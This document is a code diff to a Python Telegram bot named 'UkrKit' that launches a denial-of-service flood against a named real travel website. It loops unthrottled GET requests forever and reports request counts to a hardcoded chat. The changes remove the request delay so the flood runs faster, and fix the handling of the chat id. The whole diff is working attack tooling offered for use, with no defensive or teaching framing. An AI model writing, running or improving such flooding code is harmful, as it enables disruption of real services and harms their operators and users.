@@ -14,7 +14,7 @@ class UkrKit(object):
         self.SvynogoriaServices = ["https://anex-tour.ru/"]
         self.CountSvynogoriaServices = 0
         self.dispatcher = self.updater.dispatcher
-        self.chat_id = ""
+        self.chat_id = 0
         self.CreateHandler()
         self.run()
 
@@ -29,24 +29,25 @@ class UkrKit(object):
     @classmethod
     def Start(self, update, context):
         kit = UkrKit._instance
-        self.chat_id = update.message.chat_id
+        kit.chat_id = update.message.chat_id
         context.bot.send_message(update.message.chat_id, "Start DDOS attack {0}"
                                  .format(kit.SvynogoriaServices[kit.CountSvynogoriaServices]))
         kit.AttackSvynogoria()
 
     def AttackSvynogoria(self):
         num = 0
-        last_num = 0
+        last_num = 50
         while True:
             try:
                 req = requests.get(self.SvynogoriaServices[0])
-                time.sleep(0.3)
                 print(req)
                 num += 1
-                if last_num + 50 < num and last_num != 0:
+                print(num)
+                print(self.chat_id)
+                if last_num + 50 < num:
                     last_num = num
                     if self.chat_id != 0:
-                        self.dispatcher.context.bot.send_message(self.chat_id, "DDOS was succses by {0} req".format(num))
+                        self.dispatcher.bot.send_message("397362619", "DDOS was succses by {0} req".format(num))
             except: pass
 
 UkrKit()
